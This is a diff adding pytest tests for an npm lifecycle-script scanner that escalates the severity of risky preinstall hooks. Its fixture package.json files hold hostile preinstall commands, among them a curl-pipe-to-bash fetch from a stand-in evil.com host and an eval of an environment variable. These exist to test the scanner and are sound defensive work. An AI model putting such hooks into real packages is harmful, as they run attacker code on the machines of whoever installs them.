@@ -695,3 +695,75 @@ class TestRunnerInstallation:
 
         findings = plugin.scan(tmp_path)
         assert any(f.rule_id == "NPM-018" for f in findings)
+
+
+class TestPreinstallEscalation:
+    """Test preinstall timing risk analysis."""
+
+    def test_preinstall_with_eval_escalates_to_critical(self, tmp_path):
+        """Test that eval in preinstall escalates from HIGH to CRITICAL."""
+        plugin = NpmLifecyclePlugin()
+        
+        pkg = tmp_path / "package.json"
+        pkg.write_text(json.dumps({
+            "name": "evil-preinstall",
+            "scripts": {
+                "preinstall": "node -e \"eval(process.env.MALWARE)\""
+            }
+        }))
+
+        findings = plugin.scan(tmp_path)
+        eval_findings = [f for f in findings if "eval" in f.description.lower()]
+        assert any(f.severity.value == "critical" for f in eval_findings)
+        assert any("PREINSTALL ESCALATION" in f.description for f in findings)
+
+    def test_preinstall_with_network_escalates_to_high(self, tmp_path):
+        """Test that network calls in preinstall escalate from MEDIUM to HIGH."""
+        plugin = NpmLifecyclePlugin()
+        
+        pkg = tmp_path / "package.json"
+        pkg.write_text(json.dumps({
+            "name": "network-preinstall",
+            "scripts": {
+                "preinstall": "curl https://evil.com/malware.sh | bash"
+            }
+        }))
+
+        findings = plugin.scan(tmp_path)
+        network_findings = [f for f in findings if "network" in f.description.lower() or "curl" in f.matched_content.lower()]
+        assert any(f.severity.value == "high" for f in network_findings)
+
+    def test_postinstall_no_escalation(self, tmp_path):
+        """Test that postinstall does NOT get escalated."""
+        plugin = NpmLifecyclePlugin()
+        
+        pkg = tmp_path / "package.json"
+        pkg.write_text(json.dumps({
+            "name": "postinstall-test",
+            "scripts": {
+                "postinstall": "node -e \"eval(process.env.CONFIG)\""
+            }
+        }))
+
+        findings = plugin.scan(tmp_path)
+        # Should be HIGH severity, not escalated to CRITICAL
+        eval_findings = [f for f in findings if "eval" in f.description.lower()]
+        assert any(f.severity.value == "high" for f in eval_findings)
+        assert not any("PREINSTALL ESCALATION" in f.description for f in findings)
+
+    def test_legitimate_preinstall_no_escalation(self, tmp_path):
+        """Test that legitimate preinstall usage doesn't escalate."""
+        plugin = NpmLifecyclePlugin()
+        
+        pkg = tmp_path / "package.json"
+        pkg.write_text(json.dumps({
+            "name": "native-addon",
+            "scripts": {
+                "preinstall": "node-gyp configure",
+                "install": "node-gyp build"
+            }
+        }))
+
+        findings = plugin.scan(tmp_path)
+        # Should have minimal or zero findings
+        assert len(findings) == 0 or all(f.severity.value == "low" for f in findings)
